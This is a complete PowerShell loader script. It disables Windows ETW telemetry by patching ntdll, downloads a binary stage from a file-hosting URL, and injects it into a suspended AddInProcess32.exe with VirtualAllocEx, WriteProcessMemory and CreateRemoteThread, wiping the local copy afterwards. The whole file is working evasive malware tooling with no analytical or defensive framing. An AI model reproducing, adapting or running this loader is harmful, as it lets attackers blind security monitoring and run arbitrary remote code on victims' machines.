[CmdletBinding()]
param(
    [string]$SpawnPath
)

$PayloadUrl = 'https://files.catbox.moe/nfasiv.bin'
$HostPath = "$env:windir\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe"

$ErrorActionPreference = 'Stop'

if (-not ('NativeLoader' -as [type])) {
    $interop = @'
using System;
using System.Runtime.InteropServices;

public static class NativeLoader
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static PROCESS_INFORMATION SpawnSuspended(string path)
    {
        STARTUPINFO si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        string commandLine = "\"" + path + "\"";
        const uint CREATE_SUSPENDED = 0x00000004;
        const uint CREATE_NO_WINDOW = 0x08000000;
        if (!CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
        {
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
        }
        return pi;
    }

    public static UIntPtr USize(int value)
    {
        return new UIntPtr(unchecked((uint)value));
    }
}
'@
    Add-Type -TypeDefinition $interop -Language CSharp
}

function Invoke-EtwPatch {
    $ntdll = [NativeLoader]::GetModuleHandle('ntdll.dll')
    if ($ntdll -eq [IntPtr]::Zero) { throw '[!] Could not resolve ntdll.dll' }

    $patch = [byte[]](0x33, 0xC0, 0xC3)   # xor eax, eax / ret -> Write calls return STATUS_SUCCESS
    $patched = 0

    foreach ($name in 'EtwEventWrite', 'EtwEventWriteEx', 'EtwEventWriteFull', 'EtwEventWriteString', 'EtwEventWriteTransfer') {
        $fn = [NativeLoader]::GetProcAddress($ntdll, $name)
        if ($fn -eq [IntPtr]::Zero) { continue }

        $oldProtect = 0
        if (-not [NativeLoader]::VirtualProtect($fn, [NativeLoader]::USize($patch.Length), 0x40, [ref]$oldProtect)) { continue }

        [Runtime.InteropServices.Marshal]::Copy($patch, 0, $fn, $patch.Length)

        $unused = 0
        [void][NativeLoader]::VirtualProtect($fn, [NativeLoader]::USize($patch.Length), $oldProtect, [ref]$unused)
        $patched++
    }

    Write-Verbose ('[+] ETW patched: {0} function(s)' -f $patched)
}

function Resolve-HostPath {
    param([string]$Override)
    if ($Override) {
        if (-not (Test-Path -LiteralPath $Override -PathType Leaf)) { throw "[!] SpawnPath not found: $Override" }
        return (Resolve-Path -LiteralPath $Override).ProviderPath
    }
    if (-not (Test-Path -LiteralPath $HostPath -PathType Leaf)) { throw "[!] AddInProcess32.exe not found at $HostPath" }
    return $HostPath
}

function Get-PayloadBlob {
    param([Parameter(Mandatory = $true)][string]$Source)

    if (Test-Path -LiteralPath $Source -PathType Leaf) {
        return [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $Source).ProviderPath)
    }

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $client = New-Object Net.WebClient
    try {
        $client.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36')
        $bytes = $client.DownloadData($Source)
    } finally {
        $client.Dispose()
    }

    if (-not $bytes -or $bytes.Length -eq 0) { throw '[!] Stage download returned no data' }
    return $bytes
}

function Invoke-StagedInject {
    param(
        [Parameter(Mandatory = $true)]$Target,
        [Parameter(Mandatory = $true)][byte[]]$Blob
    )

    $hProc = $Target.hProcess
    $MEM_COMMIT_RESERVE = 0x3000
    $PAGE_EXECUTE_READWRITE = 0x40

    try {
        $remote = [NativeLoader]::VirtualAllocEx($hProc, [IntPtr]::Zero, [NativeLoader]::USize($Blob.Length), $MEM_COMMIT_RESERVE, $PAGE_EXECUTE_READWRITE)
        if ($remote -eq [IntPtr]::Zero) { throw ('[!] VirtualAllocEx failed (Win32 {0})' -f ([Runtime.InteropServices.Marshal]::GetLastWin32Error())) }

        $written = [UIntPtr]::Zero
        if (-not [NativeLoader]::WriteProcessMemory($hProc, $remote, $Blob, [NativeLoader]::USize($Blob.Length), [ref]$written)) {
            throw ('[!] WriteProcessMemory failed (Win32 {0})' -f ([Runtime.InteropServices.Marshal]::GetLastWin32Error()))
        }
    } finally {
        [Array]::Clear($Blob, 0, $Blob.Length)
        [GC]::Collect()
        Write-Verbose '[+] Local stage wiped after transfer'
    }

    $hThread = [NativeLoader]::CreateRemoteThread($hProc, [IntPtr]::Zero, [UIntPtr]::Zero, $remote, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) { throw ('[!] CreateRemoteThread failed (Win32 {0})' -f ([Runtime.InteropServices.Marshal]::GetLastWin32Error())) }

    [void][NativeLoader]::WaitForSingleObject($hThread, 500)
    [void][NativeLoader]::CloseHandle($hThread)

    return $remote
}

Invoke-EtwPatch

$blob = Get-PayloadBlob -Source $PayloadUrl
Write-Verbose ('[+] Encrypted stage in memory: {0} bytes' -f $blob.Length)

$hostExe = Resolve-HostPath -Override $SpawnPath
Write-Verbose ('[+] Spawning suspended host: {0}' -f $hostExe)

$target = [NativeLoader]::SpawnSuspended($hostExe)
Write-Verbose ('[+] Host pid={0} tid={1} (primary thread suspended, never resumed)' -f $target.dwProcessId, $target.dwThreadId)

try {
    $stageBase = Invoke-StagedInject -Target $target -Blob $blob
} catch {
    [void][NativeLoader]::TerminateProcess($target.hProcess, 1)
    [void][NativeLoader]::CloseHandle($target.hThread)
    [void][NativeLoader]::CloseHandle($target.hProcess)
    throw
}

[void][NativeLoader]::CloseHandle($target.hThread)
[void][NativeLoader]::CloseHandle($target.hProcess)

$base = [int64]$stageBase
Write-Host ('[+] staged | pid={0} | base=0x{1:X} | enc={2}B | etw=patched | ps=wiped | mt=suspended' -f $target.dwProcessId, $base, $blob.Length)
